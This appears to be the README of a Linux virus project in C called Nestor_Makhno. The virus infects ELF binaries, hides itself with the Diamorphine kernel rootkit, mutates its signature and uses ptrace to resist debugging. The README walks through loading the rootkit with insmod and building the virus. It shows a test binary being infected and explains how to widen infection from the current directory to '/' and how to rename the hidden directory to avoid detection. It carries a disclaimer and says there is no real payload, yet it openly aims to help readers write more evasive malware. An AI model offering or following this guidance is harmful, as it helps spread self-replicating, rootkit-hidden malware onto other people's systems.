# Nestor_Makhno
Linux virus in C that uses mutation and rootkit functionality

Nestor_Makhno is a simple Linux virus that uses a rootkit(Diamorphine) to help hide its tracks and avoid av detection. The historical Nestor Makhno was famous for a lot, but one thing was being the first to begin using machine guns on covered wagons. He didn't create machine guns or wagons, but he knew these things would work well together. His ideas are still credited as the first proto-tank and first drive-by shooting. Virus writing has used some of the same techniques as rootkits long before this virus code existed here. The naming of this project as Nestor_Makhno is only to pay tribute and inspire other programmers to think outside the box and barrow techiques from other malware to create betrer viri.  

The Diamorphine rootkit mostly used to make the process invisible in the pids.c file. As-is, it will also be used to create a hidden directory in /dev/shm/diamorphine_secret_def_not_a_virus. To avoid detection we suggest renaming this directory in the code of simmple.c

```
$ grep mkdir virus/simple.c
   mkdir("/dev/shm/diamorphine_secret_def_not_a_virus",0775);
```

Diamorphine will hide any folder on the system who's name begins with "diamorphine_secret". So be sure to include this with any locations that should be hidden. You may also want to build and run the virus portion of Nestor_Makhno from a folder like this to avoid dectection as well. 

To use this code, first go to the Diamorphine directory, build and install it:

```
$ cd ./Diamorphine
$ make
$ sudo insmod ./diamorphine.ko
```

If you expirence errors with these steps, you most likely do not have kernel headers installed. On Debian you may install them with the following:

```
$ sudo apt search linux-headers-$(uname -r)
```

Then go to the directory for the virus and build it:

```
$ cd ../virus
$ make
```

To prevent abuse, there is no real payload used with this code. Instead only an infamous quote by the historical Nestor Makhno will be injected into binaries. After completing you will find a binary called 'Nester_Makhno' and another called 'hello' to be used for testing. The code is set here to only infect files in the same directory:

```
$ grep '^   scan' virus/simple.c
   scan_dir(".", virus);
```

The above location may be editted to '/' or any desired location if you have a vm or sandbox. You will also need to change to that location with the binary, or change to that directory in its code. It should also go without saying, but DO NOT RELEASE THIS CODE INTO THE WILD. THIS IS FOR TESTING AND EDUCATIONAL PURPOSES ONLY. I am not responsible for any damage this may cause. Depending on your location, running this code, even without a malicious payload, may be illegal on devices you do not own. So you have been warned. 

Running the code you will see the quote from our payload: 

```
$ cd ./virus
$ ./Nestor_Makhno
Death to all those who stand in the way of freedom for the working people!
``` 
You can silence this by outputting to /dev/null. After this, you will find the hello binary will also excute this quote:

```
$ ./hello        
Death to all those who stand in the way of freedom for the working people!
Hello!
```

This is despite this string not being found in the code of hello.c:

```
$ cat ./hello.c 
#include <stdio.h> 

int main(){ 
    printf("Hello!\n");
}
```

Using virus strategies of the past, the modify.c file in the virus directory is used to randomly obscure this code's signature in memory. Basically making this a mutation virus as well. PTRACE has been used in trace.c to help prevent debugging. Combined with the rootkit functionality, this will make detection much more difficult, but not impossible.

If you wish to make changes to this code, the following line will need to be updated:

```
$ grep 'define PARASITE_LENGTH' simple.c
#define PARASITE_LENGTH 14800 /* PARASITE_LENGTH the size of compiling virus */
```

This will need to match the number of bytes in the compiled binary:

```
$ ls -l Nestor_Makhno
-rwxr-xr-x 1 user user 14800 Mar  9 02:19 Nestor_Makhno
```

It should be noted that while the virus has a GNU 3 License, the Diamorphine rootkit has its own separate license located in its folder.

Otherwise functionality of the virus might cease to work correctly.

Information on the historical Nestor Makhno may be found here:

https://en.wikipedia.org/wiki/Nestor_Makhno

Information on the Diamorphine rootkit may be found here:

https://github.com/bms8197/diamorphine 
